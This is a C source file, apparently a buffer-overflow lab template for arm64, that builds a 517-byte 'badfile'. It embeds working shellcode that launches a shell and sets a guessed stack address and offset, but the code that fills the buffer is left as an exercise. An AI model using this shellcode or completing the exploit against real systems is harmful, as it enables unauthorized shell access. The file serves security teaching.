/* exploit.c  */

/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";


void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    unsigned long fr = 0xfffffffff320 , offset =192, addr;
    //change the stack frame value according to what you get.
    
    char *ptr;
    unsigned long *addr_ptr; // address values in arm64 are 64 bit long
    unsigned int *addrP , nop = 0x1F2003D5 ; // nop values is 32 bit long
    int  bsize = 517;

    /* You need to fill the buffer with appropriate contents here */
    
    /* You need to have at least 8 byte 8 byte aligned 0s */

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

